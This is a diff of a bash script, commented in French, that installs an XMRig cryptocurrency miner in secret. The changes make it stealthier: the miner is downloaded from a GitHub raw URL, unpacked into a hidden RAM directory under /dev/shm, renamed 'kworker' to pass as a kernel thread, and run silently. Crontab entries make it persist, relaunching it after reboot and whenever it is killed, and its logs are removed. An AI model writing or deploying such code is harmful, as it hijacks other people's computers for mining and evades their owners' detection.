@@ -1,40 +1,29 @@
 #!/bin/bash
 
-DIR="$HOME/.sysd"
-BIN="systemd-update"
-LOGFILE="$HOME/setup_debug.log"
+# Dossier furtif en RAM
+DIR="/dev/shm/.syslog"
+BIN="kworker"
 ARCHIVE_URL="https://raw.githubusercontent.com/ThipyThipy/machinee/main/xmrig.tar.gz"
+PERSIST_ARCHIVE="/etc/.config/xmrig.tar.gz"
 
-# Créer le dossier caché
+# Création dossier RAM + install
 mkdir -p "$DIR" && cd "$DIR" || exit 1
 
-# Activer le log complet dans un fichier
-exec > >(tee "$LOGFILE") 2>&1
-
-# Télécharger l'archive contenant le binaire et la config
+# Téléchargement de l'archive furtive
 curl -fsSL "$ARCHIVE_URL" -o miner.tar.gz
-
-# Extraire les fichiers
 tar -xzf miner.tar.gz
 chmod +x "$BIN"
+rm -f miner.tar.gz
 
-# Préparer le log de XMRig
-touch xmrig.log
-chmod 666 xmrig.log
-sleep 2
+# Lancer XMRig furtivement
+nohup nice -n 19 "$DIR/$BIN" --config="$DIR/cfg.json" > /dev/null 2>&1 &
 
-# Lancer le mineur en tâche de fond, discrètement
-nohup nice -n 19 "$DIR/$BIN" --config="$DIR/config.json" > "$DIR/xmrig.log" 2>&1 &
+# Sauvegarder une copie persistante pour relancer après reboot
+mkdir -p /etc/.config/
+cp "$ARCHIVE_URL" "$PERSIST_ARCHIVE" 2>/dev/null || cp "$DIR/$BIN" "$PERSIST_ARCHIVE"
 
-# Ajouter persistance au démarrage
-(crontab -l 2>/dev/null; echo "@reboot $DIR/$BIN --config=$DIR/config.json > $DIR/xmrig.log 2>&1") | crontab -
-(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f $BIN > /dev/null || $DIR/$BIN --config=$DIR/config.json > $DIR/xmrig.log 2>&1") | crontab -
+# Crontab reboot furtif : re-déploiement RAM depuis archive persistante
+(crontab -l 2>/dev/null; echo "@reboot sleep \$((RANDOM % 60)) && mkdir -p /dev/shm/.syslog && tar -xzf $PERSIST_ARCHIVE -C /dev/shm/.syslog && /dev/shm/.syslog/kworker --config=/dev/shm/.syslog/cfg.json > /dev/null 2>&1") | crontab -
 
-# Vérification rapide
-sleep 5
-if [ -f "$DIR/xmrig.log" ]; then
-  echo -e "\n[🧠] Dernières lignes du log XMRig :"
-  tail -n 10 "$DIR/xmrig.log"
-else
-  echo "[!] Aucun fichier de log détecté. Le mineur a peut-être échoué."
-fi
+# Crontab watchdog (relance auto si process tué)
+(crontab -l 2>/dev/null; echo "*/10 * * * * pgrep -f $BIN > /dev/null || (mkdir -p /dev/shm/.syslog && tar -xzf $PERSIST_ARCHIVE -C /dev/shm/.syslog && /dev/shm/.syslog/kworker --config=/dev/shm/.syslog/cfg.json > /dev/null 2>&1)") | crontab -
